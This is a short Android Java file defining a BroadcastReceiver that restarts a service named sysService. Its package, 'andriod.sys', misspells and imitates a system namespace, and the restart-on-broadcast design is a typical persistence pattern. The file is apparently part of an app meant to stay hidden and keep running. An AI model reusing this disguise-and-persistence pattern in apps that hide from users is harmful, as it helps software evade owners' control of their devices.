package andriod.sys;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class restartReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        context.startService(new Intent(context, sysService.class));

    }
}
